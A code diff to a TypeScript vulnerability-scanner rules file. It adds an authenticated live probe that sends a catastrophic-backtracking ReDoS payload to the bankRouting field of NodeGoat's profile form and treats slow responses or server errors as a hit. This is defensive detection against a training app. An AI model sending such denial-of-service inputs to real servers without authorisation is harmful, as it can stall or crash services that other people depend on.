@@ -9300,10 +9300,67 @@ const nodegoatTutorialSsrfRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function nodegoatTutorialRedosLiveProbe(ctx: RuleContext): Promise<RuleResult> {
+  const cookie = await nodegoatAuthenticatedSessionCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const profileUrl = new URL("/profile", ctx.origin).toString();
+  const profileDoc = await ctx.probe.get(profileUrl, {
+    maxBytes: 32768,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (profileDoc.status < 200 || profileDoc.status >= 400) return NEGATIVE;
+  if (!/name=["']bankRouting["']|id=["']bankRouting["']/i.test(profileDoc.body)) return NEGATIVE;
+  const csrfMatch = profileDoc.body.match(/name="_csrf"\s+value="([^"]*)"/i);
+  const csrf = csrfMatch?.[1] ?? "";
+  const catastrophicRouting = `${"0".repeat(28)}#`;
+  const startMs = Date.now();
+  const postDoc = await ctx.probe.get(profileUrl, {
+    method: "POST",
+    body: `firstName=Thugir&lastName=ReDosProbe&bankAcc=123456789&bankRouting=${encodeURIComponent(
+      catastrophicRouting
+    )}&_csrf=${encodeURIComponent(csrf)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded", Cookie: cookie },
+    maxBytes: 8192,
+    timeoutMs: 20000
+  });
+  const elapsedMs = Date.now() - startMs;
+  const redosSignal =
+    postDoc.status >= 500 ||
+    elapsedMs > 8000 ||
+    /Internal Server Error|ETIMEDOUT|timeout/i.test(postDoc.body);
+  if (!redosSignal) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: postDoc.status >= 500 ? 0.93 : 0.9,
+    evidence: {
+      profileUrl,
+      bankRoutingPattern: `${catastrophicRouting.slice(0, 8)}...`,
+      elapsedMs,
+      status: postDoc.status,
+      snippet: postDoc.body.slice(0, 200).trim(),
+      note: "NodeGoat POST /profile bankRouting validates via catastrophic backtracking regex /([0-9]+)+#/ — ReDoS live oracle (/tutorial/redos documents this sink)"
+    }
+  };
+}
+
+const nodegoatTutorialRedosLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  return nodegoatTutorialRedosLiveProbe(ctx);
+};
+
 const nodegoatTutorialRedosRouteLiveOracle: Rule = async (ctx) => {
   if (!isNodegoatHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
   if (!/\/tutorial\/redos\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await nodegoatTutorialRedosLiveProbe(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: { ...live.evidence, scannedUrl: pageUrl }
+    };
+  }
   const result = await nodegoatTutorialMarkers(ctx, "redos", [
     {
       label: "ReDoS tutorial title",
@@ -89980,6 +90037,7 @@ export const RULES: Record<string, Rule> = {
   nodegoatTutorialA9RouteLiveOracle,
   nodegoatTutorialA10RouteLiveOracle,
   nodegoatTutorialSsrfRouteLiveOracle,
+  nodegoatTutorialRedosLiveOracle,
   nodegoatTutorialRedosRouteLiveOracle,
   nodegoatResearchSsrfRouteLiveOracle,
   nodegoatLearnOpenRedirectLiveOracle,
@@ -90007,8 +90065,8 @@ export const RULES: Record<string, Rule> = {
   nodegoatProfileRedosRouteLiveOracle,
   nodegoatProfileStoredXssLiveOracle,
   nodegoatProfileStoredXssRouteLiveOracle,
-  nodegoatUploadRouteLiveOracle,
   nodegoatAdminRouteLiveOracle,
+  nodegoatUploadRouteLiveOracle,
   vulnforgeAcademyLevelSqliRouteLiveOracle,
   vulnforgeAcademyLevel4SqliRouteLiveOracle,
   vulnforgeAcademyLevel6SqliRouteLiveOracle,
